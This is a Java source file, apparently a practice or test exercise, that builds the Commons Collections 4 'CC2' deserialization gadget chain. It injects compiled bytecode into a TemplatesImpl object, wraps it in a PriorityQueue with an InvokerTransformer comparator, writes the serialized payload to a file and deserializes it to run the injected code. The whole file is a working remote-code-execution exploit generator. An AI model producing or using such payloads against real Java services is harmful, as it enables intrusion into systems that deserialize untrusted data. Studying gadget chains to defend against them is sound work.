package Javac;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

public class tempImpl_test_CC2
{
    public static void setfield(Object obj, String name,Object value)throws Exception
    {
        Field f=obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, value);
    }
    public static void main(String[] args)throws Exception
    {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.get(Javac.hello_tempImpl.class.getName());
        byte[] bytecode = cc.toBytecode();
        TemplatesImpl templates = new TemplatesImpl();
        setfield(templates, "_bytecodes",new byte[][]{bytecode});
        setfield(templates, "_name","hello");
        setfield(templates, "_tfactory",new TransformerFactoryImpl());
        Transformer transformer=new InvokerTransformer("toString",null,null);
//        Transformer transformer2=new InvokerTransformer("newTransformer",null,null);
        Comparator comparator=new TransformingComparator(transformer);
        PriorityQueue queue=new PriorityQueue(2,comparator);
        queue.add(templates);
        queue.add(templates);
        setfield(transformer,"iMethodName","newTransformer");

        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos=new ObjectOutputStream(baos);
        oos.writeObject(queue);
        oos.close();
        FileOutputStream fos=new FileOutputStream("CC2_payload.txt");
        fos.write(baos.toByteArray());
        ObjectInputStream ois=new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
        ois.readObject();
    }
}
